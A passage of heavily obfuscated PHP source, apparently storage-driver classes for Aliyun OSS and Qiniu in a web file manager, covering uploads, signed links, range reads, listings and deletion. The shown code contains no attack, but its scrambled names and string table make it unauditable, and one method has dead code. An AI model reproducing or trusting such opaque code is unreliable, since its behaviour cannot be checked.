$×ø·…Ğ = parse_url_query($Áê„÷”[$ÖßÕúêË[174]]); $…•ÖÕ‡Ã = $this->client->listParts($this->bucket, $this->pathEncode($´§›ÍŞÇ), $×ø·…Ğ[$ÖßÕúêË[237]]); $ ‡û—‘¹ = $…•ÖÕ‡Ã->getListPart(); $ºÜÀš·¿ = array(); foreach ($ ‡û—‘¹ as $²ÙõÜ) { $ºÜÀš·¿[] = array($ÖßÕúêË[1418] => $²ÙõÜ->getPartNumber(), $ÖßÕúêË[1419] => trim($²ÙõÜ->getETag(), $ÖßÕúêË[118])); } unset($Áê„÷”[$ÖßÕúêË[239]], $Áê„÷”[$ÖßÕúêË[243]]); $™¡£íÊÀ = $this->multiUploadAuthData($´§›ÍŞÇ, $Áê„÷”); if (empty($™¡£íÊÀ)) { return !1; } return array($ÖßÕúêË[248] => $™¡£íÊÀ, $ÖßÕúêË[238] => $Áê„÷”[$ÖßÕúêË[238]], $ÖßÕúêË[250] => $ºÜÀš·¿); } public function download($Ä¸‡ˆøÁ, $ÛŞª­³¨) { if ($this->isFolder($Ä¸‡ˆøÁ)) { return !1; } try { $×ø×­ Î = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÛŞª­³¨); $×ø×­ Î = $this->trafficLimit($_SERVER[™»È’øè][109], $×ø×­ Î); $this->client->getObject($this->bucket, $this->pathEncode($Ä¸‡ˆøÁ), $×ø×­ Î); } catch (OSS\Core\OssException $œÎŸ½—¿) { return !1; } return $ÛŞª­³¨; } public function fileSubstr($‘òß‡, $…¶îººÀ = 0, $¸·ˆ×Šû = false) { if ($…¶îººÀ === -1) { $šÎÕÙ×Ò = array(); } else { if ($¸·ˆ×Šû === !1) { $Â˜ø±ÅÛ = $this->size($‘òß‡); } else { $Â˜ø±ÅÛ = $…¶îººÀ + $¸·ˆ×Šû - 1; } $šÎÕÙ×Ò = array(OSS\OssClient::OSS_RANGE => "{$…¶îººÀ}\55{$Â˜ø±ÅÛ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($‘òß‡), $šÎÕÙ×Ò); } catch (OSS\Core\OssException $á ®ç®ğ) { think_exception($á ®ç®ğ->getMessage()); return !1; } } private function trafficLimit($£¯…ÖİÄ, $ëÀØ·£Ó = array()) { $ÁŠöŞÜ· =& $_SERVER[™»È’øè]; if ($£¯…ÖİÄ == $ÁŠöŞÜ·[1424] && $this->isUploadServer() || $£¯…ÖİÄ == $ÁŠöŞÜ·[109] && $this->isFileOutServer()) { return $ëÀØ·£Ó; } $¶Ï¬ù¡ = floatval($GLOBALS[$ÁŠöŞÜ·[6]][$ÁŠöŞÜ·[89]][$ÁŠöŞÜ·[107]][$£¯…ÖİÄ]) * 1024 * 1024 * 8; if (!$¶Ï¬ù¡) { return $ëÀØ·£Ó; } $¶Ï¬ù¡ = $¶Ï¬ù¡ < 819200 ? 819200 : ($¶Ï¬ù¡ > 838860800 ? 838860800 : $¶Ï¬ù¡); $ëÀØ·£Ó[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¶Ï¬ù¡); return $ëÀØ·£Ó; } public function link($´»­Ò†Ã, $¦ÑÍšæ© = array()) { $Ú€‡¾¶š =& $_SERVER[™»È’øè]; if (!$this->exist($´»­Ò†Ã) || $this->isFolder($´»­Ò†Ã)) { return !1; } try { $¦ÑÍšæ© = $this->trafficLimit($Ú€‡¾¶š[109], $¦ÑÍšæ©); $ÂÃÃŞ„ = $this->client->signUrl($this->bucket, $this->pathEncode($´»­Ò†Ã), 3600 * 12, $Ú€‡¾¶š[244], $¦ÑÍšæ©); return $this->getCdnLink($ÂÃÃŞ„); } catch (OSS\Core\OssException $à¦ä£ôÁ) { return !1; } } public function fileOut($™ÑÛ°ˆë, $ğßÂ²åù = false, $Ô£Ò¶¥ = false, $Î¶—²¿ö = '') { $Ø¿¬öÍ„ =& $_SERVER[™»È’øè]; if ($this->isFileOutServer()) { return $this->fileOutServer($™ÑÛ°ˆë, $ğßÂ²åù, $Ô£Ò¶¥, $Î¶—²¿ö); } if (!$Ô£Ò¶¥) { $Ô£Ò¶¥ = $this->pathThis($™ÑÛ°ˆë); } $Ô£Ò¶¥ = rawurlencode($Ô£Ò¶¥); $ä„ªéßŠ = get_file_mime(get_path_ext($Ô£Ò¶¥)); if ($ä„ªéßŠ == $Ø¿¬öÍ„[231]) { return parent::fileOut($™ÑÛ°ˆë, $ğßÂ²åù, $Ô£Ò¶¥, $Î¶—²¿ö); } $ğßÂ²åù = $ğßÂ²åù ? $Ø¿¬öÍ„[1434] : $Ø¿¬öÍ„[1435]; $Ê…¥§ƒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ø¿¬öÍ„[1436] . rawurlencode("{$ğßÂ²åù}\73\146\151\x6c\x65\156\141\x6d\145\75{$Ô£Ò¶¥}")); $Ê…¥§ƒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ø¿¬öÍ„[1437] . rawurlencode($ä„ªéßŠ); $¡Ñì¬²ù = $this->link($™ÑÛ°ˆë, $Ê…¥§ƒ); $this->fileOutLink($¡Ñì¬²ù); } public function fileOutServer($ŞÑ©×¾, $Š”Áë×ó = false, $’Ò½ñ­Â = false, $¤ñµëÙú = '') { parent::fileOut($ŞÑ©×¾, $Š”Áë×ó, $’Ò½ñ­Â, $¤ñµëÙú); } public function fileOutImage($‹ë†¿¦, $º¶¦×æ÷ = 250) { if ($this->size($‹ë†¿¦) > 1024 * 1024 * 20) { return $this->fileOutImageServer($‹ë†¿¦, $º¶¦×æ÷); } $àˆÃ‘–í = array(OSS\OssClient::OSS_PROCESS => $_SERVER[™»È’øè][1438] . $º¶¦×æ÷); $Ú÷ùŠƒı = $this->link($‹ë†¿¦, $àˆÃ‘–í); $this->fileOutLink($Ú÷ùŠƒı); } public function fileOutImageServer($áŠ¨Úì, $·Öâ£ô‚ = 250) { parent::fileOutImage($áŠ¨Úì, $·Öâ£ô‚); } public function fileOutLink($íşˆı…ù) { $úıÃÎî² =& $_SERVER[™»È’øè]; if (!$this->isCdnHost() && substr($íşˆı…ù, 0, 7) == $úıÃÎî²[1360]) { $íşˆı…ù = $úıÃÎî²[1361] . substr($íşˆı…ù, 7); } header($úıÃÎî²[161] . $íşˆı…ù); die; } public function hashMd5($Á¤ıŞøø, $Ì¯İûõ = '') { $ÏÕ‰…¹ó =& $_SERVER[™»È’øè]; $œèúÙä = $this->_objectMeta($Á¤ıŞøø); if (!$œèúÙä) { return $ÏÕ‰…¹ó[12]; } if (!isset($œèúÙä[$ÏÕ‰…¹ó[1414]]) && !empty($Ì¯İûõ)) { $Ô±ªîßî = $this->updateObjMeta($Á¤ıŞøø, array($ÏÕ‰…¹ó[1414] => $Ì¯İûõ)); $œèúÙä[$ÏÕ‰…¹ó[1414]] = $Ô±ªîßî ? $Ì¯İûõ : $ÏÕ‰…¹ó[12]; } return isset($œèúÙä[$ÏÕ‰…¹ó[1414]]) ? strtolower($œèúÙä[$ÏÕ‰…¹ó[1414]]) : $ÏÕ‰…¹ó[12]; } public function size($‹†èïğ©) { $–Ñ”ã¤Œ = $this->objectMeta($‹†èïğ©); return $–Ñ”ã¤Œ ? $–Ñ”ã¤Œ[$_SERVER[™»È’øè][76]] : 0; } public function info($€œ…«ô®) { if ($this->isFolder($€œ…«ô®)) { return $this->folderInfo($€œ…«ô®); } else { if ($this->isFile($€œ…«ô®)) { return $this->fileInfo($€œ…«ô®); } } return !1; } public function exist($µå¶Ø™) { return $this->isFile($µå¶Ø™) || $this->isFolder($µå¶Ø™); } public function isFile($ÂìòˆÓ) { return !$this->isFolder($ÂìòˆÓ) && $this->objectMeta($ÂìòˆÓ); } public function isFolder($Ÿ™çÂ¿‡) { return $this->cacheMethod($_SERVER[™»È’øè][165], $Ÿ™çÂ¿‡); } protected function objectMeta($¿åßƒ£û) { return $this->cacheMethod($_SERVER[™»È’øè][167], $¿åßƒ£û); } protected function _objectMeta($Ş¡üÛ) { $»¨ıìœ =& $_SERVER[™»È’øè]; try { $âÒªÆ´” = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ş¡üÛ)); } catch (OSS\Core\OssException $Ì¬àÇÀã) { $âÒªÆ´” = !1; } if ($âÒªÆ´”) { $âÒªÆ´”[$»¨ıìœ[76]] = intval($âÒªÆ´”[$»¨ıìœ[1412]]); } return $âÒªÆ´”; } protected function _isFolder($õæºä“Œ) { $Ïğ”ÀêÚ =& $_SERVER[™»È’øè]; if ($õæºä“Œ == $Ïğ”ÀêÚ[12] || $õæºä“Œ == $Ïğ”ÀêÚ[8]) { return !0; } $ğ½ê¾ØË = array($Ïğ”ÀêÚ[1407] => $Ïğ”ÀêÚ[8], $Ïğ”ÀêÚ[1408] => rtrim($õæºä“Œ, $Ïğ”ÀêÚ[8]) . $Ïğ”ÀêÚ[8], $Ïğ”ÀêÚ[1409] => 1, $Ïğ”ÀêÚ[1410] => $Ïğ”ÀêÚ[12]); $À÷×åñ° = $this->client->listObjects($this->bucket, $ğ½ê¾ØË); if ($À÷×åñ°->getObjectList() || $À÷×åñ°->getPrefixList()) { return !0; } return !1; } } goto F‡œ ¡–£³; F‡œ ¡–£³: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($õîä—›õ) { parent::__construct(); require_once SDK_DIR . $_SERVER[™»È’øè][1439]; $this->_init($õîä—›õ); } public function _init($¯¾– ëÔ) { $ôÂÂ‚şØ =& $_SERVER[™»È’øè]; $this->config = $¯¾– ëÔ; foreach ($¯¾– ëÔ as $Úâ×Öõí => $¨Œ¶ïª) { if (isset($this->{$Úâ×Öõí})) { $this->{$Úâ×Öõí} = $¨Œ¶ïª; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ôÂÂ‚şØ[1440] . LNG($ôÂÂ‚şØ[1398])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Òü¾è×, $¸ÀˆŠæ = '', $¦¹³®Å = REPEAT_RENAME) { if ($this->setContent($Òü¾è×, $¸ÀˆŠæ)) { return $this->getPathOuter($Òü¾è×); } return !1; } public function mkdir($æí”–ì”, $Ñ×œÁÙ = REPEAT_SKIP) { $İœ¢ÎŠò =& $_SERVER[™»È’øè]; $°§ûÒ½‡ = trim($æí”–ì”, $İœ¢ÎŠò[8]); if ($this->_isFolder($°§ûÒ½‡)) { return $this->getPathOuter($°§ûÒ½‡); } $æí”–ì” = $°§ûÒ½‡ . $İœ¢ÎŠò[8]; $œ«ŸÍï• = get_path_this($°§ûÒ½‡); $‰İåø«î = $æí”–ì” . $œ«ŸÍï•; if (!$this->mkfile($‰İåø«î)) { return !1; } if (!$this->moveFile($‰İåø«î, $æí”–ì”)) { $this->delFile($‰İåø«î); return !1; } return $this->getPathOuter($°§ûÒ½‡); } public function copyFile($ù˜ş²ù¨, $ÎÃÅû±ì) { $÷•ä–º“ = $this->bucketManager->copy($this->bucket, $ù˜ş²ù¨, $this->bucket, $ÎÃÅû±ì, !0); return $÷•ä–º“ ? !1 : $this->getPathOuter($ÎÃÅû±ì); } public function moveFile($šÅäßùº, $ò™—àõ ) { $ª´ô‹‘ô = $this->bucketManager->move($this->bucket, $šÅäßùº, $this->bucket, $ò™—àõ , !0); return $ª´ô‹‘ô ? !1 : $this->getPathOuter($ò™—àõ ); } public function delFile($ßˆĞ¤Çô) { if (!$this->exist($ßˆĞ¤Çô)) { return !0; } $ÕÉø¸¨ = $this->bucketManager->delete($this->bucket, $ßˆĞ¤Çô); return $ÕÉø¸¨ ? !1 : !0; } public function delFolder($çÛø­) { $¥è®ÃĞÖ =& $_SERVER[™»È’øè]; if (!$this->exist($çÛø­)) { return !0; } $this->listItemCache = !1; $¬©ò÷âë = $this->fileList($çÛø­); $this->listItemCache = !0; $ÍÒ¨Ë = trim($çÛø­, $¥è®ÃĞÖ[8]) . $¥è®ÃĞÖ[8]; if (!empty($çÛø­) && $çÛø­ !== $¥è®ÃĞÖ[211] && !in_array($ÍÒ¨Ë, $¬©ò÷âë[$¥è®ÃĞÖ[82]])) { $¬©ò÷âë[$¥è®ÃĞÖ[82]][] = $ÍÒ¨Ë; } $ÈñŠ³ˆÆ = $this->delByBatch($¬©ò÷âë[$¥è®ÃĞÖ[83]]); if (!$ÈñŠ³ˆÆ) { return !1; } $ÈñŠ³ˆÆ = $this->delByBatch($¬©ò÷âë[$¥è®ÃĞÖ[82]]); if (!$ÈñŠ³ˆÆ) { return !1; } return $this->delFile($ÍÒ¨Ë); } private function delByBatch($ª„‹Š¨) { foreach (array_chunk($ª„‹Š¨, 1000) as $çÏÏöÄ) { $ì£¶ø„ß = $this->bucketManager->buildBatchDelete($this->bucket, $çÏÏöÄ); list($§äÆ¡˜¨, $€âó¡•ú) = $this->bucketManager->batch($ì£¶ø„ß); if ($€âó¡•ú) { return !1; } } return !0; } public function rename($ˆèòğŒ¡, $Á¯®ıÎ) { return $this->renameObject($ˆèòğŒ¡, $Á¯®ıÎ); } public function fileInfo($ßÔÎÓŠ¶, $ÂØ»í¥· = false, $ÛÍãÖ’ü = array()) { $…Îì˜Íå =& $_SERVER[™»È’øè]; $´ğ‹ˆ£ = array($…Îì˜Íå[32] => $this->pathThis($ßÔÎÓŠ¶), $…Îì˜Íå[84] => $this->getPathOuter($…Îì˜Íå[8] . $ßÔÎÓŠ¶), $…Îì˜Íå[33] => $…Îì˜Íå[213], $…Îì˜Íå[76] => isset($ÛÍãÖ’ü[$…Îì˜Íå[1441]]) ? $ÛÍãÖ’ü[$…Îì˜Íå[1441]] : 0, $…Îì˜Íå[174] => $this->ext($ßÔÎÓŠ¶)); if ($ÂØ»í¥·) { return $´ğ‹ˆ£; } $´ğ‹ˆ£[$…Îì˜Íå[214]] = $´ğ‹ˆ£[$…Îì˜Íå[85]] = 0; $´ğ‹ˆ£[$…Îì˜Íå[215]] = $´ğ‹ˆ£[$…Îì˜Íå[216]] = !0; if (empty($ÛÍãÖ’ü)) { $ÛÍãÖ’ü = $this->objectMeta($ßÔÎÓŠ¶); if (!$ÛÍãÖ’ü) { return $´ğ‹ˆ£; } } if (isset($ÛÍãÖ’ü[$…Îì˜Íå[217]]) && $ÛÍãÖ’ü[$…Îì˜Íå[217]]) { $´ğ‹ˆ£[$…Îì˜Íå[218]] = $ÛÍãÖ’ü[$…Îì˜Íå[217]]; } if (isset($ÛÍãÖ’ü[$…Îì˜Íå[227]]) && $ÛÍãÖ’ü[$…Îì˜Íå[227]]) { $´ğ‹ˆ£[$…Îì˜Íå[218]] = $ÛÍãÖ’ü[$…Îì˜Íå[227]]; } if (isset($ÛÍãÖ’ü[$…Îì˜Íå[1442]])) { $´ğ‹ˆ£[$…Îì˜Íå[85]] = substr($ÛÍãÖ’ü[$…Îì˜Íå[1442]] . $…Îì˜Íå[12], 0, 10); } if (isset($ÛÍãÖ’ü[$…Îì˜Íå[1441]])) { $´ğ‹ˆ£[$…Îì˜Íå[76]] = $ÛÍãÖ’ü[$…Îì˜Íå[1441]]; } return $´ğ‹ˆ£; } public function folderInfo($‡‹¼óœ, $š‹›¥½ = false) { $ƒ×õ³Òº =& $_SERVER[™»È’øè]; $Îé°”ââ = array($ƒ×õ³Òº[32] => $this->pathThis($‡‹¼óœ), $ƒ×õ³Òº[84] => $this->getPathOuter($ƒ×õ³Òº[8] . $‡‹¼óœ), $ƒ×õ³Òº[33] => $ƒ×õ³Òº[75]); if ($š‹›¥½) { return $Îé°”ââ; } $Îé°”ââ[$ƒ×õ³Òº[214]] = $Îé°”ââ[$ƒ×õ³Òº[85]] = 0; $Îé°”ââ[$ƒ×õ³Òº[215]] = $Îé°”ââ[$ƒ×õ³Òº[216]] = !0; $‡‹¼óœ = rtrim($‡‹¼óœ, $ƒ×õ³Òº[8]) . $ƒ×õ³Òº[8]; $Á‡—“ìÊ = $this->objectMeta($‡‹¼óœ); if (isset($Á‡—“ìÊ[$ƒ×õ³Òº[1442]])) { $Îé°”ââ[$ƒ×õ³Òº[85]] = substr($Á‡—“ìÊ[$ƒ×õ³Òº[1442]] . $ƒ×õ³Òº[12], 0, 10); } return $Îé°”ââ; } public function listPath($¹ıÕ§ì, $‰è±Âş = false) { $—²™âØ =& $_SERVER[™»È’øè]; $€¶¨¼Ê¢ = $this->fileList($¹ıÕ§ì, $—²™âØ[8], !0); foreach ($€¶¨¼Ê¢[$—²™âØ[82]] as $Š’•‹ò => $µ…ä¢ñ«) { $€¶¨¼Ê¢[$—²™âØ[82]][$Š’•‹ò] = $this->folderInfo($µ…ä¢ñ«, $‰è±Âş); } foreach ($€¶¨¼Ê¢[$—²™âØ[83]] as $Š’•‹ò => $µ…ä¢ñ«) { $€¶¨¼Ê¢[$—²™âØ[83]][$Š’•‹ò] = $this->fileInfo($µ…ä¢ñ«[$—²™âØ[94]], $‰è±Âş, $µ…ä¢ñ«); } return $€¶¨¼Ê¢; } public function has($ä˜Åßšş, $¢…‚üØ‹ = false, $©¹¤™à¿ = true) { $Îç ËåÌ =& $_SERVER[™»È’øè]; $ä˜Åßšş = trim($ä˜Åßšş, $Îç ËåÌ[8]); $¾Û‹¦Ì = empty($ä˜Åßšş) && $ä˜Åßšş !== $Îç ËåÌ[211] ? $Îç ËåÌ[12] : $ä˜Åßšş . $Îç ËåÌ[8]; $ŠÄÃù‰í = $Îç ËåÌ[12]; $ÎÏ¿ïÃª = 500; $øöûÉ›  = $Îç ËåÌ[8]; $üŸıÑ¼à = $ô“†¡Î = 0; while (!0) { check_abort(); list($ĞÀó»ö, $ÀàİÕ£ü) = $this->bucketManager->listFiles($this->bucket, $¾Û‹¦Ì, $ŠÄÃù‰í, $ÎÏ¿ïÃª, $øöûÉ› ); if ($ÀàİÕ£ü) { break; } $ŠÄÃù‰í = array_key_exists($Îç ËåÌ[1410], $ĞÀó»ö) ? $ŠÄÃù‰í = $ĞÀó»ö[$Îç ËåÌ[1443]] : $Îç ËåÌ[12]; if ($¢…‚üØ‹) { if (!empty($ĞÀó»ö[$Îç ËåÌ[1444]])) { $üŸıÑ¼à += count($ĞÀó»ö[$Îç ËåÌ[1444]]); } if (!empty($ĞÀó»ö[$Îç ËåÌ[1445]])) { $ô“†¡Î += count($ĞÀó»ö[$Îç ËåÌ[1445]]); } if ($ŠÄÃù‰í === $Îç ËåÌ[12]) { break; } continue; } if ($©¹¤™à¿) { if (!empty($ĞÀó»ö[$Îç ËåÌ[1444]])) { return !0; } } else { if (!empty($ĞÀó»ö[$Îç ËåÌ[1445]])) { return !0; } } if ($ŠÄÃù‰í === $Îç ËåÌ[12]) { break; } } if ($¢…‚üØ‹) { return array($Îç ËåÌ[222] => $üŸıÑ¼à, $Îç ËåÌ[223] => $ô“†¡Î); } return !1; } public function listAll($ş¡Éäóë) { $ïÛ©ŒŸ =& $_SERVER[™»È’øè]; $íÑ§ìÖ = $this->fileList($ş¡Éäóë, $ïÛ©ŒŸ[12], !0); $‰Ê×Â… = array_to_keyvalue($íÑ§ìÖ[$ïÛ©ŒŸ[83]], $ïÛ©ŒŸ[32]); foreach ($íÑ§ìÖ[$ïÛ©ŒŸ[82]] as $ñîä¼Šº) { if (is_string($ñîä¼Šº)) { $‰Ê×Â…[$ñîä¼Šº] = array($ïÛ©ŒŸ[76] => 0); } } return $this->listAllFiles($ş¡Éäóë, $‰Ê×Â…); } private function fileList($ö¡Ô‘, $îÔü‡å• = '', $Î½§»÷ü = 0) { $¸Ÿ³ä¢ =& $_SERVER[™»È’øè]; $ö¡Ô‘ = trim($ö¡Ô‘, $¸Ÿ³ä¢[8]); $ñÆµÎùş = empty($ö¡Ô‘) && $ö¡Ô‘ !== $¸Ÿ³ä¢[211] ? $¸Ÿ³ä¢[12] : $ö¡Ô‘ . $¸Ÿ³ä¢[8]; $‘À¾‚Ğ = $¸Ÿ³ä¢[12]; $¯„ù’‚­ = 1000; $ÍªÇ¹Ô¬ = $’‡„Ø‡ = array(); while (!0) { check_abort(); list($”ê™ÒçÓ, $íÓûöòÎ) = $this->bucketManager->listFiles($this->bucket, $ñÆµÎùş, $‘À¾‚Ğ, $¯„ù’‚­, $îÔü‡å•); if ($íÓûöòÎ) { break; } $‘À¾‚Ğ = array_key_exists($¸Ÿ³ä¢[1410], $”ê™ÒçÓ) ? $‘À¾‚Ğ = $”ê™ÒçÓ[$¸Ÿ³ä¢[1443]] : $¸Ÿ³ä¢[12]; $…‘·±ŠÍ = isset($”ê™ÒçÓ[$¸Ÿ³ä¢[1444]]) ? $”ê™ÒçÓ[$¸Ÿ³ä¢[1444]] : array(); $üîùå³Ä = isset($”ê™ÒçÓ[$¸Ÿ³ä¢[1445]]) ? $”ê™ÒçÓ[$¸Ÿ³ä¢[1445]] : array(); foreach ($…‘·±ŠÍ as $øÈâ¿şİ) { if ($øÈâ¿şİ[$¸Ÿ³ä¢[94]] == $ñÆµÎùş) { continue; } $’úê“®¨ = $øÈâ¿şİ[$¸Ÿ³ä¢[94]]; $…ìšÀç = $øÈâ¿şİ[$¸Ÿ³ä¢[1441]]; $øÈâ¿şİ[$¸Ÿ³ä¢[76]] = $…ìšÀç; $ïÚ¤šğÅ = $…ìšÀç == 0 && substr($’úê“®¨, strlen($’úê“®¨) - 1, 1) == $¸Ÿ³ä¢[8] ? !0 : !1; $this->cacheMethodInfoSet($’úê“®¨, $ïÚ¤šğÅ, $øÈâ¿şİ); if ($ïÚ¤šğÅ) { $ÍªÇ¹Ô¬[] = $’úê“®¨; continue; } $’‡„Ø‡[] = $Î½§»÷ü ? $øÈâ¿şİ : $’úê“®¨; } foreach ($üîùå³Ä as $’úê“®¨) { if ($’úê“®¨ == $ñÆµÎùş) { continue; } $ÍªÇ¹Ô¬[] = $’úê“®¨; $this->cacheMethodInfoSet($’úê“®¨, !0); } if ($‘À¾‚Ğ === $¸Ÿ³ä¢[12]) { break; } } $this->cacheMethodInfoSet($ö¡Ô‘, !0); return array($¸Ÿ³ä¢[82] => $ÍªÇ¹Ô¬, $¸Ÿ³ä¢[83] => $’‡„Ø‡); } public function canRead($ÈóşÖœ¼) { return $this->exist($ÈóşÖœ¼) ? !0 : !1; } public function canWrite($àÛ¼ûû) { return $this->exist($àÛ¼ûû) ? !0 : !1; } public function getContent($éš‡õõ¹) { return $this->fileSubstr($éš‡õõ¹, 0, -1); } public function setContent($Ã´À¢¶, $ğĞÍƒ¼¼ = '') { $«Á¿¦Ş = $this->tempFile($this->pathThis($Ã´À¢¶)); file_put_contents($«Á¿¦Ş, $ğĞÍƒ¼¼); if ($this->upload($Ã´À¢¶, $«Á¿¦Ş)) { $this->tempFileRemve($«Á¿¦Ş); return !0; } return !1; } public function refreshUrls($úã­˜ş­) { $ÀœÌËì =& $_SERVER[™»È’øè]; $…´ÆƒÈ´ = array(); if (is_array($úã­˜ş­)) { foreach ($úã­˜ş­ as $¾›ï¨Ó‘) { $…´ÆƒÈ´[] = $this->link($¾›ï¨Ó‘); } } else { $…´ÆƒÈ´[] = $this->link($úã­˜ş­); } $Â¼šñéª = new Qiniu\Cdn\CdnManager($this->auth); list($–ã•£¹æ, $«®³Ïí) = $Â¼šñéª->refreshUrls($…´ÆƒÈ´); if ($«®³Ïí) { return !1; } return $–ã•£¹æ[$ÀœÌËì[1212]] == $ÀœÌËì[784] ? !0 : !1; } public function fileSubstr($˜Ñáò¹», $úÛÃ¿ı, $ñŠ˜œ½–) { $éÖŸè±‚ =& $_SERVER[™»È’øè]; if (!($«Å¸”„° = $this->link($˜Ñáò¹»))) { return !1; } $áã»ğ‹ö = !1; if ($ñŠ˜œ½– > 0) { $Œ‹ò‘£ê = $úÛÃ¿ı + $ñŠ˜œ½– - 1; $áã»ğ‹ö = array($éÖŸè±‚[1446] . $úÛÃ¿ı . $éÖŸè±‚[429] . $Œ‹ò‘£ê); } $îïÎŒ¿Ù = url_request($«Å¸”„°, $éÖŸè±‚[244], !1, $áã»ğ‹ö); return $îïÎŒ¿Ù[$éÖŸè±‚[775]] ? $îïÎŒ¿Ù[$éÖŸè±‚[1232]] : !1; } public function upload($ñ§é¢œ“, $ÅÃîñ³, $¦Ô¡é£ = false, $„§Ğâ»” = REPEAT_REPLACE) { $‡üõØŒ¤ = new Qiniu\Storage\UploadManager(); $–ÀÛÓá = $this->auth->uploadToken($this->bucket, $ñ§é¢œ“); $êëÛŞúÛ = get_file_mime(get_path_ext($ÅÃîñ³)); list($»‡ŠÕæ, $¡£™áÇì) = $‡üõØŒ¤->putFile($–ÀÛÓá, $ñ§é¢œ“, $ÅÃîñ³, null, $êëÛŞúÛ); return $¡£™áÇì ? !1 : $this->getPathOuter($ñ§é¢œ“); } public function uploadFormData($ ñˆ·¨Î, $³ÃÒ—ƒ‚ = 3600) { return $this->uploadToken($ ñˆ·¨Î, $³ÃÒ—ƒ‚); } public function multiUploadFormData($Œ§©½Üé, $¼ä¶Ú× = 3600) { return $this->uploadToken($Œ§©½Üé, $¼ä¶Ú×); } private function uploadToken($ñãå÷åË, $»‘šÅÅ = 3600) { $¡Ã”½åÓ =& $_SERVER[™»È’øè]; $¤Ü»³Â€ = $»‘šÅÅ; $¡òÌöÇú = array($¡Ã”½åÓ[1447] => $¡Ã”½åÓ[1448]); $óáÕ¹¸¿ = $ñãå÷åË; $®ŒÕ“ø = $this->auth->uploadToken($this->bucket, $óáÕ¹¸¿, $¤Ü»³Â€, $¡òÌöÇú, !0); $íŸôÓ¯ = empty($this->region) || $this->region == $¡Ã”½åÓ[1449] ? $¡Ã”½åÓ[12] : $¡Ã”½åÓ[429] . $this->region; $°ò™äüƒ = http_type() . "\x3a\x2f\57\165\160\154\x6f\x61\144{$íŸôÓ¯}\x2e\x71\151\156\151\165\x70\56\143\x6f\x6d\x2f"; return array($¡Ã”½åÓ[1450] => $®ŒÕ“ø, $¡Ã”½åÓ[1451] => $°ò™äüƒ); } public function download($¬­ìÇÁû, $€‰¼ı‹¿) { $„§ğ¢û¡ = IO::getPathInner(IO::mkfile($€‰¼ı‹¿)); if (!($¦åĞˆ¿ = $this->link($¬­ìÇÁû))) { return !1; } $¶ì¥“…÷ = 0; $ÙÅ´¶ˆ = 1024 * 200; $Æ¥Ğé” = fopen($„§ğ¢û¡, $_SERVER[™»È’øè][1452]); while (!0) { $Éìçôë = $this->fileSubstr($¬­ìÇÁû, $¶ì¥“…÷, $ÙÅ´¶ˆ); if ($Éìçôë === !1) { return !1; } fwrite($Æ¥Ğé”, $Éìçôë); $¶ì¥“…÷ += $ÙÅ´¶ˆ; if (strlen($Éìçôë) < $ÙÅ´¶ˆ) { break; } } fclose($Æ¥Ğé”); return $€‰¼ı‹¿; } public function link($õ±÷±öè, $åàıóÖ´ = '') { if (!$this->isFile($õ±÷±öè)) { return !1; } $®£ı·‚² = $this->getHost() . $_SERVER[™»È’øè][8] . $this->pathEncode($õ±÷±öè) . $åàıóÖ´; return $this->auth->privateDownloadUrl($®£ı·‚², 3600 * 12); } public function fileOut($…ì¯ÆÒÎ, $‰Š¢ªÅ² = false, $™¿¶¬ö = false, $™‡ô·Ä = '') { $„‰¶ø’Õ =& $_SERVER[™»È’øè]; if ($this->isFileOutServer()) { return $this->fileOutServer($…ì¯ÆÒÎ, $‰Š¢ªÅ², $™¿¶¬ö, $™‡ô·Ä); } if (!$™¿¶¬ö) { $™¿¶¬ö = $this->pathThis($…ì¯ÆÒÎ); } $‹éÃ‡©Ë = $‰Š¢ªÅ² ? $„‰¶ø’Õ[1453] . rawurlencode($™¿¶¬ö) : $„‰¶ø’Õ[12]; $†ëñ™Ôæ = $this->link($…ì¯ÆÒÎ, $‹éÃ‡©Ë); $this->fileOutLink($†ëñ™Ôæ); } public function fileOutServer($Ö¹ÜÔø³, $Ë»‹«©˜ = false, $£ù…ÕÈì = false, $ì¨ÌÏÆ = '') { parent::fileOut($Ö¹ÜÔø³, $Ë»‹«©˜, $£ù…ÕÈì, $ì¨ÌÏÆ); } public function fileOutImage($×‹ù”œ, $Şàíª²Ÿ = 250) { $œ¬“» ¢ = $this->link($×‹ù”œ, $_SERVER[™»È’øè][1454] . $Şàíª²Ÿ); $this->fileOutLink($œ¬“» ¢); } public function fileOutImageServer($ò³£†Ÿ¦, $µ«ĞÀˆ = 250) { parent::fileOutImage($ò³£†Ÿ¦, $µ«ĞÀˆ); } public function hashMd5($Áù§‘“”) { $ã¸ûÖ‡È =& $_SERVER[™»È’øè]; $—Ö½ÑÊÈ = $this->objectMeta($Áù§‘“”); return isset($—Ö½ÑÊÈ[$ã¸ûÖ‡È[227]]) ? $—Ö½ÑÊÈ[$ã¸ûÖ‡È[227]] : !1; $›¶¢ÜÑ = $this->link($Áù§‘“”, $ã¸ûÖ‡È[1455]); } public function size($ïóîÈşª) { $ƒÂ…ıÉø = $this->objectMeta($ïóîÈşª); return $ƒÂ…ıÉø ? $ƒÂ…ıÉø[$_SERVER[™»È’øè][76]] : 0; } public function info($„í˜•äô) { if ($this->isFolder($„í˜•äô)) { return $this->folderInfo($„í˜•äô); } else { if ($this->isFile($„í˜•äô)) { return $this->fileInfo($„í˜•äô); } } return !1; } public function exist($æßÍæ«¾) { return $this->isFile($æßÍæ«¾) || $this->isFolder($æßÍæ«¾); } public function isFile($¿Šğ²ãŠ) { return !$this->isFolder($¿Šğ²ãŠ) && $this->objectMeta($¿Šğ²ãŠ); } public function isFolder($İÆËÒèë) { return 